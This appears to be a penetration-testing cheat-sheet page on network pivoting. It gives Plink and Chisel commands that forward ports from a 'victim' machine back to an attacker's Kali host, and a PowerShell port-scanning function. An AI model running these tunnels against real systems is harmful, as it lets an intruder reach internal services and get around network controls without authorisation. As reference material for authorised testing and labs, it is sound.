# Network

### Plink Port Forwarding

```csharp
#10.10.10.19 == kali_IP. 8888 == Port to redirect.
.\plink.exe -l root -pw toor 10.10.10.19 -N -R 8888:127.0.0.1:8888
```

{% embed url="https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe" %}
Plink - Windows 32bits download
{% endembed %}

### Chisel TCP tunnel over HTTP

```csharp
#Download chisel for victim machine version
#10.10.10.19 == kali_IP. 4506 == Port to redirect.
.\chisel client 10.10.10.19:10000 R:4506:127.0.0.1:4506 //In Victim Machine
.\chisel server -p 10000 --reverse //In Kali Machine
```

{% embed url="https://github.com/jpillora/chisel/releases" %}
Chisel - Releases
{% endembed %}

### Scan ports from Powershell

```csharp
function Test-Port {
$computer=Read-Host "[*] IP Address:"
$port=Read-Host "[*] Port Numbers (separate them by comma):"
$port.split(',') | Foreach-Object -Process {If (($a=Test-NetConnection $computer -Port $_ -WarningAction SilentlyContinue).tcpTestSucceeded -eq $true) {Write-Host $a.Computername $a.RemotePort -ForegroundColor Green -Separator " ==> "} else {Write-Host $a.Computername $a.RemotePort -Separator " ==> " -ForegroundColor Red}}
}
```
